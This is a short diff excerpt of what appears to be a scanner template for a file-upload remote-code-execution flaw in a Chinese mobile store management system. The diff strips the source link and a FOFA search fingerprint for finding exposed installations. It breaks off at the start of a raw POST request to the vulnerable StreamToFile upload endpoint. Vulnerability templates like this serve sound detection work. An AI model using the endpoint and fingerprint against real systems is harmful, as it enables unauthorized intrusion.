@@ -3,12 +3,8 @@ info:
   name: 西联软件移动门店管理系统 StreamToFile 存在文件上传致RCE漏洞
   author: hacktwo
   severity: high
-  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/ug4aaf9agb8w7oml'
+  description: ''
   tags: rce,file-upload,2025
-  metadata:
-    source: yuque-hacktwo-dtdx2v
-    doc-slug: ug4aaf9agb8w7oml
-    fofa: body="西联软件提供云计算服务"
 http:
 - raw:
   - 'POST /api/UploadDB/StreamToFile HTTP/1.1
